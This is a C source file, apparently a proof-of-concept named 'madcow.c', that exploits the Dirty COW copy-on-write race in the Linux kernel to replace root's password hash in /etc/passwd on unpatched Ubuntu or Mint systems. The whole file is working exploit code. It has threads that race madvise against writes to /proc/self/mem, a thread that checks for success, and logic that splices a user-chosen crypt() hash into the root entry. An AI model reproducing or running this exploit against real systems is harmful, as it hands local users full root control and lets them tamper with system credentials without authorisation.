/*
* madcow.c
*
* Exploits the dirtycow bug to change the password of root on an unpatched
* Ubuntu Linux install.
*
* PoC code used from dirtyc0w.c
*
* Tested on Linux Mint 18
*
* :^)
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <crypt.h>

#define ROOT "root:"
#define PASSWD "/etc/passwd"
#define MAXITER 500000

void *map;
int f;
struct stat st;
int done, iter;

void *madvise_thread(void *arg)
{

    char *passwd = (char *)arg;

    int c=0;
    while(!done && iter < MAXITER)
    {
        /*
        You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
        > This is achieved by racing the madvise(MADV_DONTNEED) system call
        > while having the page of the executable mmapped in memory.
        */
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("madvise %d\n\n",c);
}

void *procselfmem_thread(void *arg)
{

    char *encrypted_passwd = (char *)arg;

    /*
    You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
    >  The in the wild exploit we are aware of doesn't work on Red Hat
    >  Enterprise Linux 5 and 6 out of the box because on one side of
    >  the race it writes to /proc/self/mem, but /proc/self/mem is not
    >  writable on Red Hat Enterprise Linux 5 and 6.
    */
    int f=open("/proc/self/mem",O_RDWR);
    int c=0;
    while(!done && iter < MAXITER) {
        /*
        You have to reset the file pointer to the memory position.
        */
        lseek(f,(uintptr_t) map,SEEK_SET);
        c+=write(f,encrypted_passwd,strlen(encrypted_passwd));
    }
    printf("procselfmem %d\n\n", c);
}

void *checksuccess_thread(void *arg)
{
    char *encrypted_passwd = (char *)arg;

    while(!done && iter < MAXITER)
    {
        FILE *passwd_f = fopen(PASSWD, "rb");
        fseek(passwd_f, 0, SEEK_END);
        long passwd_fsize = ftell(passwd_f);
        fseek(passwd_f, 0, SEEK_SET);

        char *string = malloc(passwd_fsize + 1);
        fread(string, passwd_fsize, 1, passwd_f);
        string[passwd_fsize] = '\0';
        fclose(passwd_f);

        if (strstr(string, encrypted_passwd) != NULL)
        {
            done = 1;
        }
        free(string);
        iter++;
    }
}

// Inserts encrypted password into password file buffer
char *insert_new_pass(char *str, char *passwd)
{
    char *root_start = strstr(str, ROOT) + strlen(ROOT);
    char *root_end = strstr(root_start, ":");

    char *new_str = malloc(strlen(str) + strlen(PASSWD));
    memset(new_str, 0, strlen(str)+strlen(PASSWD));

    strncat(new_str, str, root_start-str);
    strncat(new_str, passwd, strlen(passwd));
    strcat(new_str, root_end);

    return new_str;
}

// Returns a string buffer filled with a files contents
char *file_buffer(char *file)
{
    // Store password file into a buffer
    FILE *passwd_f = fopen(PASSWD, "rb");
    fseek(passwd_f, 0, SEEK_END);
    long passwd_fsize = ftell(passwd_f);
    fseek(passwd_f, 0, SEEK_SET);

    char *string = malloc(passwd_fsize + 1);
    fread(string, passwd_fsize, 1, passwd_f);
    string[passwd_fsize] = '\0';
    fclose(passwd_f);

    return string;
}

int main(int argc,char *argv[])
{
    char *encrypted_passwd, *passwd, *new_passwd;

    // Need 2 arguments
    if (argc<2)
    {
        fprintf(stderr, "%s\n", "Usage: ./madcow [new password]");
        return 1;
    }

    // Encrypt user-supplied password, and add to loaded passwd buffer
    encrypted_passwd = crypt(argv[1], "xx");
    //encrypted_passwd = argv[1];
    passwd = file_buffer(PASSWD);
    new_passwd = insert_new_pass(passwd, encrypted_passwd);
    free(passwd);


    // The actual exploit, taken from dirtyc0w.c
    pthread_t pth1,pth2,pth3;
    /*
    You have to open the file in read only mode.
    */
    f=open(PASSWD,O_RDONLY);
    fstat(f,&st);
    /*
    You have to use MAP_PRIVATE for copy-on-write mapping.
    > Create a private copy-on-write mapping.  Updates to the
    > mapping are not visible to other processes mapping the same
    > file, and are not carried through to the underlying file.  It
    > is unspecified whether changes made to the file after the
    > mmap() call are visible in the mapped region.
    */
    /*
    You have to open with PROT_READ.
    */
    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    printf("mmap %zx\n\n",(uintptr_t) map);
    /*
    You have to do it on two threads.
    The third thread is for checking success
    */
    done = 0;
    iter = 0;
    pthread_create(&pth1,NULL,madvise_thread,PASSWD);
    pthread_create(&pth2,NULL,procselfmem_thread,new_passwd);
    pthread_create(&pth3,NULL,checksuccess_thread,encrypted_passwd);

    /*
    You have to wait for the threads to finish.
    */
    pthread_join(pth1,NULL);
    pthread_join(pth2,NULL);
    pthread_join(pth3,NULL);

    return 0;
}
